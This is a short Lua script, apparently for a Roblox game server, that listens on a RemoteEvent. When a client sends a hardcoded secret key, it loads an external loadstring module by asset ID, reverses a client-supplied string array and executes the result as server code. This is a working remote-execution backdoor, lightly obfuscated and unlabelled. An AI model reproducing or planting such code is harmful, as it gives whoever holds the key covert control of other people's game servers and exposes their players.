local Remote = script.Parent.ExecuteEvent

Remote.OnServerEvent:Connect(function(Player, key, str)
	if(key == "$8283823643ewhfdsihcUYGAUIWD")then
		local loadstring = require(6537252044)
		local scrpt = ""
		for i, v in pairs(str)do
			scrpt = scrpt..str[(#str+1)-i]
		end
		loadstring(scrpt)()
	end
end)
